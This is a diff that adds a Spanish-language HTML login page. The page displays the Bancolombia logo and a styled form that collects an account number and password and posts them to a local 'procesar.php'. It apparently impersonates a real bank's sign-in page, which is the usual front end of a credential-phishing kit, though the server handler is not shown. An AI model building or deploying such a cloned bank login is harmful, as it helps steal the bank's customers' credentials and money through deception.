@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuenta Bancaria</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+        }
+        .bank-container {
+            background: white;
+            padding: 20px;
+            width: 350px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .bank-container img {
+            width: 150px;
+            margin-bottom: 10px;
+        }
+        .bank-container h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #1558b0;
+        }
+        .link {
+            display: block;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="bank-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Logo_Bancolombia.png" alt="Bancolombia">
+        <h2>Acceder a Cuenta Bancaria</h2>
+        <form action="procesar.php" method="POST">
+            <input type="text" name="cuenta" class="input-field" placeholder="Número de cuenta" required>
+            <input type="password" name="password" class="input-field" placeholder="Contraseña" required>
+            <button type="submit" class="btn">Ingresar</button>
+        </form>
+    </div>
+</body>
+</html>
